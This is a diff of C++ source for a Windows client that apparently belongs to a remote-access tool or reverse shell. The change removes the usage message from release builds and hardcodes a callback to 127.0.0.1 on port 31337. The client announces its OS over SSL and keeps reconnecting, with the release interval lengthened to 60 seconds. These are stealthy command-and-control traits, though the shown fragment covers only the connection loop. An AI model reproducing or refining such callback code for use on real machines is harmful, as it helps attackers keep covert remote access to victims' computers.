@@ -2,10 +2,15 @@
 #include "Client.hpp"
 #include "Misc.hpp"
 
+#ifdef _DEBUG
 int main(int argc, char **argv){
 	if(argc != 3){
+		std::cout<<"Use "<<argv[0]<<" host port\n";
 		return 0;
 	}
+#else
+int main(){
+#endif
 	WSADATA wsa;
 	if(WSAStartup(MAKEWORD(2,2), &wsa) != 0){
 	   #ifdef _DEBUG
@@ -22,10 +27,12 @@ int main(int argc, char **argv){
 	char *cBuffer = new char[1024];
 	int iBytes = 0;
 	while(Cli->isKeepRunning){
+		#ifdef _DEBUG
 		if(Cli->Connect(argv[1], argv[2])){
-			#ifdef _DEBUG
 			std::cout<<"Connected!!!\n";
-			#endif
+		#else
+		if(Cli->Connect("127.0.0.1", "31337")){
+		#endif
 			TryAgain:
 			iBytes = SSL_write(Cli->sslSocket, "00", 2); //01 linux 00 windows
 			if(iBytes > 0){ 
@@ -58,10 +65,8 @@ int main(int argc, char **argv){
 			#ifdef _DEBUG
 			Sleep(3000);
 			#else
-			Sleep(6000);                  
+			Sleep(60000);                  
 			#endif
-			Cli->CloseConnection();
-			//break;
 		}
 	}
 	Misc::Free(cBuffer, 1024);
